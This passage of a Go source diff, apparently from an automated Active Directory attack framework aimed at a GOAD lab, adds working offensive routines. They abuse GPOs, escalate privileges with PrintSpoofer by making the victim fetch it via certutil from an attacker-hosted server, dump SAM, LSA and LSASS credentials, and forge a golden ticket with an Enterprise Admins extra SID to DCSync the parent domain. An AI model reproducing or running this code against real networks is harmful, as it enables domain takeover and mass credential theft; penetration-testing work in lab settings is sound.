+		if gpErr == nil && tools.NxcCommandSucceeded(gpCR.Stdout+"\n"+gpCR.Stderr) {
+			fmt.Println("[*] GPO abuse: gpupdate triggered via nxc")
+		} else {
+			fmt.Println("[*] GPO abuse: gpupdate not possible (no admin) — waiting for periodic refresh")
+		}
+
+		// Poll for admin (brief — the real trigger is periodic gpupdate)
+		fmt.Printf("[*] GPO abuse: checking if admin on %s...\n", host.IP)
+		cr := utils.RunCommandCtx(ctx, "nxc", []string{
+			"smb", host.IP, "-d", domain, "-u", user, "-p", pass,
+		})
+		if cr.ExitCode == 0 && strings.Contains(cr.Stdout, "(Pwn3d!)") {
+			fmt.Printf("[+] GPO abuse: %s is now local admin on %s\n", user, host.IP)
+			state.SkipReasons[core.PhasePrivEsc] = core.SkipReason(
+				fmt.Sprintf("gpo_elevated:%s:%s", gpo.Name, gpo.GUID))
+			result.Evidence = append(result.Evidence, core.EvidenceEntry{
+				Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
+				Source: "gpo_abuse", Key: host.IP,
+				Value:      fmt.Sprintf("%s is local admin via GPO %s", user, gpo.Name),
+				Confidence: 0.9, Timestamp: time.Now(),
+			})
+			state.Creds = append(state.Creds, core.Credential{
+				Type:      core.CredPlaintext,
+				Username:  user,
+				Domain:    domain,
+				Secret:    pass,
+				Source:    "gpo_abuse",
+				Validated: true,
+			})
+			return
+		}
+		fmt.Printf("[i] GPO abuse: admin elevation pending gpupdate on %s\n", host.IP)
+	}
+}
+
+func runSweetPotatoProbe(ctx context.Context, host core.Host,
+	exec core.Executor, domain, user, pass string, result *core.ToolResult) {
+
+	if domain == "" || user == "" || pass == "" {
+		return
+	}
+
+	// ── Step 1: Upload PrintSpoofer64.exe via certutil ──────────
+	kaliIP := os.Getenv("KALI_IP")
+	if kaliIP == "" {
+		kaliIP = "172.31.125.189"
+	}
+	port := os.Getenv("KALI_PORT")
+	if port == "" {
+		port = "18900"
+	}
+	root := mustGetProjectRoot()
+
+	// Start Python HTTP server to serve files from project root
+	srv := startPythonFileServer(root)
+	if srv == nil {
+		fmt.Println("[-] PrintSpoofer: could not start file server, cannot download payload")
+		return
+	}
+	defer stopCmd(srv)
+	time.Sleep(500 * time.Millisecond)
+
+	remoteName := tools.RandString(6) + ".exe"
+	remotePath := `C:\Windows\Temp\` + remoteName
+	url := fmt.Sprintf("http://%s:%s/PrintSpoofer64.exe", kaliIP, port)
+
+	fmt.Printf("[*] PrintSpoofer: downloading from %s...\n", url)
+	dlR := exec.Execute(ctx, core.Action{
+		Artifact: fmt.Sprintf("certutil -urlcache -f %s %s", url, remotePath),
+		Method:   "mssql_run",
+		Timeout:  90 * time.Second,
+	})
+	if !dlR.Success {
+		fmt.Printf("[-] PrintSpoofer: download failed on %s\n", host.IP)
+		return
+	}
+
+	// ── Step 2: Execute PrintSpoofer to add user to Administrators ──
+	addCmd := fmt.Sprintf(`%s -c "net localgroup Administrators %s\%s /add"`, remotePath, domain, user)
+	fmt.Printf("[*] PrintSpoofer: executing on %s...\n", host.IP)
+	addR := exec.Execute(ctx, core.Action{
+		Artifact: addCmd, Method: "mssql_run",
+		Timeout: 60 * time.Second,
+	})
+	if !addR.Success {
+		fmt.Printf("[-] PrintSpoofer: execution returned no output on %s\n", host.IP)
+		// Still check Pwn3d in case it worked silently
+	}
+	fmt.Printf("[*] PrintSpoofer: output:\n%s\n", addR.Output)
+
+	// ── Step 3: Verify SMB admin access ─────────────────────────
+	cr := utils.RunCommandCtx(ctx, "nxc", []string{
+		"smb", host.IP, "-d", domain, "-u", user, "-p", pass,
+	})
+	if cr.ExitCode == 0 && strings.Contains(cr.Stdout, "(Pwn3d!)") {
+		fmt.Printf("[+] PrintSpoofer: %s\\%s is now local admin on %s\n", domain, user, host.IP)
+		// Dump SAM and LSA secrets
+		dumpSAM(ctx, host, domain, user, pass)
+		dumpLSA(ctx, host, domain, user, pass)
+	}
+	result.Evidence = append(result.Evidence, core.EvidenceEntry{
+		Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
+		Source: "printspoofer", Key: host.IP,
+		Value:      fmt.Sprintf("SYSTEM (via PrintSpoofer) — %s\\%s is admin", domain, user),
+		Confidence: 1.0, RawOutput: addR.Output, Timestamp: time.Now(),
+	})
+}
+
+func startPythonFileServer(root string) *os.Process {
+	cmd := exec.Command("python3", "-m", "http.server", "18900", "--directory", root)
+	if err := cmd.Start(); err != nil {
+		return nil
+	}
+	return cmd.Process
+}
+
+func stopCmd(proc *os.Process) {
+	if proc != nil {
+		proc.Kill()
+	}
+}
+
+func mustGetProjectRoot() string {
+	cwd, _ := os.Getwd()
+	for {
+		if _, err := os.Stat(filepath.Join(cwd, "go.mod")); err == nil {
+			return cwd
+		}
+		parent := filepath.Dir(cwd)
+		if parent == cwd {
+			return cwd
+		}
+		cwd = parent
+	}
+}
+
+func dumpSAM(ctx context.Context, host core.Host, domain, user, pass string) {
+	cr := utils.RunCommandCtx(ctx, "nxc", []string{
+		"smb", host.IP, "-d", domain, "-u", user, "-p", pass, "--sam",
+	})
+	if cr.ExitCode == 0 {
+		// Log the SAM hashes that nxc outputs
+		fmt.Printf("[+] SAM dump from %s:\n%s\n", host.IP, cr.Stdout)
+	}
+}
+
+func dumpLSA(ctx context.Context, host core.Host, domain, user, pass string) {
+	cr := utils.RunCommandCtx(ctx, "nxc", []string{
+		"smb", host.IP, "-d", domain, "-u", user, "-p", pass, "--lsa",
+	})
+	if cr.ExitCode == 0 {
+		fmt.Printf("[+] LSA secrets from %s:\n%s\n", host.IP, cr.Stdout)
 	}
 }
 
@@ -810,7 +1202,7 @@ func runMiniPlasmaProbe(ctx context.Context, host core.Host,
 
 	fmt.Printf("[*] MiniPlasma: executing Cloud Filter EoP on %s...\n", host.IP)
 	execR := exec.Execute(ctx, core.Action{
-		Artifact: mpPath, Method: "run",
+		Artifact: mpPath, Method: "mssql_run",
 		Timeout: 60 * time.Second,
 	})
 	if !execR.Success {
@@ -826,7 +1218,7 @@ func runMiniPlasmaProbe(ctx context.Context, host core.Host,
 	})
 
 	sysR := exec.Execute(ctx, core.Action{
-		Method: "system_check", Timeout: 45 * time.Second,
+		Method: "mssql_system_check", Timeout: 45 * time.Second,
 	})
 	if sysR.Success {
 		fmt.Printf("[+] MiniPlasma: SYSTEM confirmed on %s (%s)\n", host.IP, sysR.Method)
@@ -840,9 +1232,9 @@ func runMiniPlasmaProbe(ctx context.Context, host core.Host,
 
 // runPlanning runs the weighted path planner and logs results.
 // Returns a map of target → best ScoredPath for later comparison.
-func runPlanning(state *core.ADState, result *core.ToolResult, edgeCount int, availCaps []string) map[string]planner.ScoredPath {
+func runPlanning(state *core.ADState, result *core.ToolResult, availCaps []string) map[string]planner.ScoredPath {
 	plans := make(map[string]planner.ScoredPath)
-	if edgeCount <= 0 {
+	if len(state.Edges) == 0 {
 		fmt.Println("[*] No privilege edges found to analyze")
 		return plans
 	}
@@ -1009,10 +1401,9 @@ func ExecuteBestPaths(ctx context.Context, state *core.ADState, plans map[string
 	}
 
 	total := 0
-	for target, plan := range plans {
+	for _, plan := range plans {
 		n := ExecutePlannedPath(ctx, state, plan, domain, user, pass, hash, targetIP, result)
 		total += n
-		_ = target
 	}
 	return total
 }
@@ -1048,13 +1439,43 @@ func getAvailableCaps() []string {
 		// Tickets
 		"krbrelayx.py", "addspn.py",
 	}
-	var out []string
+	available := make(map[string]bool)
 	for _, t := range candidates {
 		if utils.ToolAvailable(t) {
-			out = append(out, t)
+			available[t] = true
+			addToolAliases(available, t)
 		}
 	}
+	var out []string
+	for _, t := range candidates {
+		if available[t] {
+			out = append(out, t)
+			delete(available, t)
+		}
+	}
+	for t := range available {
+		out = append(out, t)
+	}
 	return out
+}
+
+func addToolAliases(available map[string]bool, tool string) {
+	switch tool {
+	case "certipy-ad", "certipy":
+		available["certipy"] = true
+		available["certipy-ad"] = true
+	case "nxc", "netexec", "crackmapexec":
+		available["nxc"] = true
+		available["netexec"] = true
+		available["mssql"] = true
+	case "ntlmrelayx.py", "impacket-ntlmrelayx":
+		available["ntlmrelayx"] = true
+		available["ntlmrelayx.py"] = true
+		available["impacket-ntlmrelayx"] = true
+	case "coercer", "impacket-coercer":
+		available["coercer"] = true
+		available["impacket-coercer"] = true
+	}
 }
 
 // printConfidenceHealth logs a summary of edge confidence distribution
@@ -1106,4 +1527,297 @@ func hasValidatedDA(state *core.ADState) bool {
 		}
 	}
 	return false
+}
+
+func runChildToParentEscalation(state *core.ADState, result *core.ToolResult) {
+	childDC, parentDC := findChildParentDCs(state)
+	if childDC == nil || parentDC == nil {
+		return
+	}
+
+	domain, user, pass, hash := getCredential(state)
+	if domain == "" || user == "" {
+		return
+	}
+
+	fmt.Printf("[*] Child-to-parent: attempting %s(%s) → %s(%s)...\n",
+		childDC.Hostname, childDC.Domain, parentDC.Hostname, parentDC.Domain)
+
+	if _, err := utils.FindTool("impacket-secretsdump"); err != nil {
+		fmt.Println("[!] impacket-secretsdump not found, skipping child-to-parent")
+		return
+	}
+	if _, err := utils.FindTool("impacket-ticketer"); err != nil {
+		fmt.Println("[!] impacket-ticketer not found, skipping child-to-parent")
+		return
+	}
+	if _, err := utils.FindTool("impacket-lookupsid"); err != nil {
+		fmt.Println("[!] impacket-lookupsid not found, skipping child-to-parent")
+		return
+	}
+
+	// Step 1: DCSync child krbtgt
+	authSpec := buildImpacketAuth(domain, user, pass, hash, childDC.IP)
+	args := []string{authSpec, "-just-dc-user", "krbtgt"}
+	args = append(args, impacketHashArgs(hash)...)
+	fmt.Printf("[*] Child-to-parent: DCSyncing krbtgt from %s...\n", childDC.IP)
+	r := utils.RunCommandTimeout(2*time.Minute, "impacket-secretsdump", args)
+	if !r.Success {
+		fmt.Printf("[-] Child-to-parent: secretsdump failed on %s\n", childDC.IP)
+		return
+	}
+	krbtgtHash := extractKrbtgtNTHash(r.Stdout)
+	if krbtgtHash == "" {
+		fmt.Println("[-] Child-to-parent: krbtgt hash not found in secretsdump output")
+		return
+	}
+
+	// Step 2: Get child domain SID
+	childSID := resolveDomainSID(domain, user, pass, hash, childDC.IP)
+	if childSID == "" {
+		fmt.Println("[-] Child-to-parent: could not resolve child domain SID")
+		return
+	}
+
+	// Step 3: Get parent domain SID
+	parentSID := resolveDomainSID(parentDC.Domain, user, pass, hash, parentDC.IP)
+	if parentSID == "" {
+		// Some versions of lookupsid work with cross-domain principals
+		auth := buildImpacketAuth(domain, user, pass, hash, parentDC.IP)
+		lr := utils.RunCommandTimeout(45*time.Second, "impacket-lookupsid",
+			[]string{auth, "0"})
+		if lr.Success {
+			m := domainSIDRe.FindStringSubmatch(lr.Stdout)
+			if len(m) >= 2 {
+				parentSID = m[1]
+			}
+		}
+	}
+	if parentSID == "" {
+		fmt.Println("[-] Child-to-parent: could not resolve parent domain SID")
+		return
+	}
+
+	// Step 4: Forge golden ticket with extra SID
+	extraSID := parentSID + "-519" // Enterprise Admins
+	fmt.Printf("[*] Child-to-parent: forging golden ticket (extra-sid=%s)...\n", extraSID)
+	ccacheUser := "Administrator"
+	ccachePath := fmt.Sprintf("/tmp/childtoparent_%s.ccache", ccacheUser)
+	tArgs := []string{
+		"-nthash", krbtgtHash,
+		"-domain-sid", childSID,
+		"-domain", domain,
+		"-extra-sid", extraSID,
+		ccacheUser,
+	}
+	tr := utils.RunCommandTimeout(60*time.Second, "impacket-ticketer", tArgs)
+	if !tr.Success {
+		fmt.Printf("[-] Child-to-parent: ticketer failed: %s\n", tr.Stderr)
+		return
+	}
+	// Move ccache to predictable path
+	utils.RunCommandTimeout(10*time.Second, "mv",
+		[]string{fmt.Sprintf("%s.ccache", ccacheUser), ccachePath})
+
+	// Step 5: DCSync parent domain using forged ticket
+	fmt.Printf("[*] Child-to-parent: DCSyncing %s with forged ticket...\n", parentDC.IP)
+	secretsdumpArgs := []string{"-k", "-no-pass",
+		fmt.Sprintf("%s.%s", parentDC.Hostname, parentDC.Domain),
+		"-just-dc"}
+	envCmd := fmt.Sprintf("KRB5CCNAME=%s impacket-secretsdump", ccachePath)
+	// We need to call secretsdump with the env var set
+	dcsyncR := utils.RunCommandTimeout(2*time.Minute, "sh",
+		[]string{"-c", fmt.Sprintf("%s %s", envCmd, strings.Join(secretsdumpArgs, " "))})
+	if dcsyncR.Success && strings.Contains(dcsyncR.Stdout, "krbtgt") {
+		fmt.Printf("[+] Child-to-parent: DCSync of %s succeeded!\n", parentDC.Hostname)
+	}
+
+	result.Evidence = append(result.Evidence, core.EvidenceEntry{
+		Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
+		Source: "child_to_parent", Key: parentDC.IP,
+		Value:      fmt.Sprintf("Parent DCSync via extra-sid golden ticket (%s→%s)", domain, parentDC.Domain),
+		Confidence: 0.9, RawOutput: dcsyncR.Stdout, Timestamp: time.Now(),
+	})
+}
+
+func findChildParentDCs(state *core.ADState) (child, parent *core.Host) {
+	var dcs []*core.Host
+	for i := range state.Hosts {
+		if state.Hosts[i].IsDC {
+			dcs = append(dcs, &state.Hosts[i])
+		}
+	}
+	if len(dcs) < 2 {
+		return nil, nil
+	}
+	// Heuristic: the DC whose domain contains another DC's domain is the parent
+	// (e.g., sevenkingdoms.local contains north.sevenkingdoms.local)
+	for _, a := range dcs {
+		for _, b := range dcs {
+			if a.IP == b.IP {
+				continue
+			}
+			if a.Domain != "" && b.Domain != "" &&
+				strings.HasSuffix(b.Domain, "."+a.Domain) {
+				return b, a // b is child of a
+			}
+		}
+	}
+	// Fallback: alphabetical domain name = parent (unreliable but works for GOAD)
+	return nil, nil
+}
+
+func doSystemCheckAndDump(ctx context.Context, state *core.ADState, host core.Host,
+	exec core.Executor, domain, user, pass string, result *core.ToolResult, source string) bool {
+
+	r := exec.Execute(ctx, core.Action{
+		Target:  core.HostRef{Name: host.IP, Domain: domain},
+		Method:  "system_check",
+		Timeout: 45 * time.Second,
+	})
+	if !r.Success {
+		return false
+	}
+
+	fmt.Printf("[+] SYSTEM access confirmed on %s (%s, source=%s)\n", host.IP, r.Method, source)
+	result.Evidence = append(result.Evidence, core.EvidenceEntry{
+		Type: core.EvPrivEscalated, Phase: core.PhasePrivEsc,
+		Source: source, Key: host.IP, Value: "SYSTEM",
+		Confidence: 1.0, RawOutput: r.Output, Timestamp: time.Now(),
+	})
+
+	fmt.Printf("[*] Dumping credentials from %s via SAM + LSA secrets...\n", host.IP)
+	for _, flag := range []string{"--sam", "--lsa"} {
+		dumpTarget := tools.NetExecTarget{
+			Protocol: "smb", Host: host.IP,
+			Domain: domain, Username: user, Password: pass,
+		}
+		cr, err := tools.NetExec.Run(ctx, dumpTarget, flag, nil)
+		if err != nil {
+			continue
+		}
+		hashes := ParseNTLMOutput(cr.Stdout)
+		if len(hashes) == 0 {
+			continue
+		}
+		for _, h := range hashes {
+			state.Creds = append(state.Creds, core.Credential{
+				Type: core.CredHash, Username: h.Username,
+				Domain: domain, Hash: h.Hash,
+				Source: "privesc_dump", Validated: true,
+			})
+			if EnqueueHash != nil {
+				EnqueueHash("ntlm", h.Hash, h.Username, domain)
+			}
+		}
+		result.Evidence = append(result.Evidence, core.EvidenceEntry{
+			Type: core.EvCredAcquired, Phase: core.PhasePrivEsc,
+			Source: flag, Key: host.IP,
+			Value:      fmt.Sprintf("%d credentials dumped via %s", len(hashes), flag),
+			Confidence: 1.0, RawOutput: cr.Stdout, Timestamp: time.Now(),
+		})
+		fmt.Printf("[+] %s: %d credential(s) extracted from %s\n", flag, len(hashes), host.IP)
+	}
+	return true
+}
+
+// runDeepCredDump performs deep credential extraction after AV has been disabled.
+// Cascades through available tools: go-mimikatz → nanodump+pypykatz → nxc SAM/LSA.
+func runDeepCredDump(ctx context.Context, state *core.ADState, host core.Host,
+	exec core.Executor, domain, user, pass string, result *core.ToolResult) {
+
+	utils.Step("Deep credential dump (post-evasion)...")
+	dumped := 0
+
+	// Tier 1: go-mimikatz (richest output: plaintext + hashes)
+	if tools.GoMimikatz.Available() {
+		r, err := tools.GoMimikatz.Sekurlsa(ctx, tools.ExecutionRequest{})
+		if err == nil && r != nil && r.Success {
+			creds := parseMimikatzOutput(r.Stdout)
+			for _, c := range creds {
+				if c.Domain == "" {
+					c.Domain = domain
+				}
+				state.Creds = append(state.Creds, c)
+			}
+			dumped += len(creds)
+			if len(creds) > 0 {
+				utils.StepOk(fmt.Sprintf("go-mimikatz: %d credential(s)", len(creds)))
+			}
+		}
+	}
+
+	// Tier 2: nanodump + pypykatz (LSASS dump, reliable)
+	if tools.Nanodump.Available() {
+		ndLocal := findNanodump()
+		if ndLocal != "" {
+			remoteDir := `C:\Windows\Temp\`
+			deployR := exec.Execute(ctx, core.Action{
+				Artifact: ndLocal, Method: "put",
+				Arguments: []string{remoteDir}, Timeout: 30 * time.Second,
+			})
+			if deployR.Success {
+				ndPath := deployR.Output
+				dumpFile := fmt.Sprintf(`%s\lsass_%d.dmp`, remoteDir, time.Now().UnixNano())
+				defer exec.Execute(ctx, core.Action{
+					Method: "cleanup", Arguments: []string{ndPath, dumpFile}, Timeout: 15 * time.Second,
+				})
+
+				target := tools.NetExecTarget{
+					Protocol: "smb", Host: host.IP,
+					Domain: domain, Username: user, Password: pass,
+				}
+				cmd := fmt.Sprintf(`%s --write %s --fork`, ndPath, dumpFile)
+				cr, err := tools.NetExec.Run(ctx, target, "-x", []string{cmd})
+				if err == nil && cr.Success {
+					localDump := filepath.Join(os.TempDir(), fmt.Sprintf("lsass_%d.dmp", time.Now().UnixNano()))
+					getR := exec.Execute(ctx, core.Action{
+						Artifact: dumpFile, Method: "get",
+						Arguments: []string{localDump}, Timeout: 60 * time.Second,
+					})
+					if getR.Success {
+						defer os.Remove(localDump)
+						pyr := utils.RunCommand("pypykatz", "lsa", "minidump", localDump)
+						if pyr.Success {
+							creds := parseNanodumpOutput(pyr.Stdout)
+							for _, c := range creds {
+								if c.Domain == "" {
+									c.Domain = domain
+								}
+								state.Creds = append(state.Creds, c)
+								if EnqueueHash != nil && c.Hash != "" {
+									EnqueueHash("ntlm", c.Hash, c.Username, domain)
+								}
+							}
+							dumped += len(creds)
+							if len(creds) > 0 {
+								utils.StepOk(fmt.Sprintf("nanodump+pypykatz: %d credential(s)", len(creds)))
+							}
+						}
+					}
+				}
+			}
+		}
+	}
+
+	if dumped > 0 {
+		utils.StepOk(fmt.Sprintf("Deep dump complete: %d total credential(s) extracted", dumped))
+	} else {
+		utils.StepInfo("No additional creds from deep dump (SAM/LSA already captured)")
+	}
+}
+
+// findNanodump locates the nanodump binary for deployment.
+func findNanodump() string {
+	if utils.ToolAvailable("nanodump") {
+		return "nanodump"
+	}
+	return ""
+}
+
+func detectADCSWebEnrollment(state *core.ADState, hostIP string) string {
+	if len(state.ADCS) > 0 {
+		return "http://" + hostIP + "/certsrv/certfnsh.asp"
+	}
+	return ""
 }
